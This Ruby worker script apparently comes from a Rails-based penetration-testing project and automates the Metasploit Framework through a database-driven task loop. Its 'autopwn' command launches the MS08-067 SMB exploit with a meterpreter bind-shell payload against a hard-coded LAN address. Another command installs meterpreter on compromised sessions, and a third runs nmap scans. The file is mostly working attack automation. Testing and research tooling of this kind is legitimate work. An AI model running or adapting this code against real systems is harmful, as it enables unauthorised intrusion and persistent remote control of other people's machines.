require 'rubygems'
require 'eventmachine'
require "#{RAILS_ROOT}/script/worker/loader"
require "#{RAILS_ROOT}/script/worker/msf_session_event"


class CommandHandler
  
  def initialize
    puts "Initialize Framework..."
    @framework =  Msf::Simple::Framework.create
    puts "done."
    connect_db
    begin
      @framework.db.exploited_hosts.each do |h|
        h.delete
      end
    rescue ::Exception
      puts("An error occurred while deleteing exploited_hosts: #{$!} #{$!.backtrace}")
    end

    handler = MsfSessionEvent.new
    @framework.events.add_session_subscriber(handler)
    load_plugins
  end
  
  def parse_command _cmd
    cmd = _cmd.split
    if commands.has_key? cmd[0].to_s
      puts "executing #{cmd[0]}"
      send("cmd_#{cmd[0]}".to_sym, cmd[1..-1])
    else
      raise "Unknown Command"
    end
  end

  def commands
    base = {
        "autopwn" => "Starts Autopwning",
        "nmap" => "Starts a Nmap Scan",
        "session_install" => "Install meterpreter on host"
    }
  end
  
  def cmd_autopwn args
    # does not work anymore ? 
    #manager = SubnetManager.new @framework, args[0]
    #manager.get_sessions

    exploit = @framework.exploits.create("windows/smb/ms08_067_netapi")
    exploit.datastore['RHOST'] = "192.168.178.34"
    input        = Rex::Ui::Text::Input::Stdio.new
    output       = Rex::Ui::Text::Output::Stdio.new
  	session = exploit.exploit_simple(
		'Payload'     => "windows/meterpreter/bind_tcp",
		'LocalInput'  => input,
		'LocalOutput' => output)

  end
  
  def cmd_nmap args
    manager = SubnetManager.new @framework, args[0]
    manager.run_nmap
  end

  def cmd_session_install args
    if (session = @framework.sessions.get(args[0]))
      if (session.type == "meterpreter")
        puts "Install meterpreter on session."
        install_meterpreter(session)
      else
       puts "Selected session is not a meterpreter session"
      end
    else
      puts "No such session found"
    end
  end
  
  def connect_db
    # set the db driver
    @framework.db.driver = DB_SETTINGS["adapter"]
    # create the options hash
    opts = {}
    opts['adapter'] = DB_SETTINGS["adapter"]
    opts['username'] = DB_SETTINGS["username"]
    opts['password'] = DB_SETTINGS["password"]
    opts['database'] = DB_SETTINGS["database"]
    opts['host'] =  DB_SETTINGS["host"]
    opts['port'] =  DB_SETTINGS["port"]
    opts['socket'] = DB_SETTINGS["socket"]

    # This is an ugly hack for a broken MySQL adapter:
    # http://dev.rubyonrails.org/ticket/3338
    # if (opts['host'].strip.downcase == 'localhost')
    #   opts['host'] = Socket.gethostbyname("localhost")[3].unpack("C*").join(".")
    # end
    puts opts
    puts "connecting to database..."

    begin
      if (not @framework.db.connect(opts))
        raise RuntimeError.new("Failed to connect to the database: #{@framework.db.error}. Did you edit the config.yaml?")
      end
    rescue ::Exception
      puts("An error occurred while connecting to database: #{$!} #{$!.backtrace}")
    end

    puts "connected to database."
  end

  def tasks_loop
    Msf::DBManager::Task.find_new_tasks.each do |task|
      begin
        task.progress = 1
        task.save
        Msf::Plugin::FidiusLogger.task_id = task.id
        parse_command task.module

        task.progress = 100
        task.save
      rescue ::Exception
        puts("An error occurred while executing task#{task.inspect}: #{$!} #{$!.backtrace}")
        task.error = $!.inspect
        task.save
      end
    end
  end

  def load_plugins
    begin
      require "#{RAILS_ROOT}/script/worker/msf_payload_loader.rb"
      @framework.plugins.load("#{RAILS_ROOT}/script/worker/msf_plugins/payload_logger")
    rescue ::Exception
      puts("An error occurred while loading plugins: #{$!} #{$!.backtrace}")
    end
  end
end

$command_handler = CommandHandler.new

EM.run do
  EventMachine::add_periodic_timer 10, proc{$command_handler.tasks_loop}
end
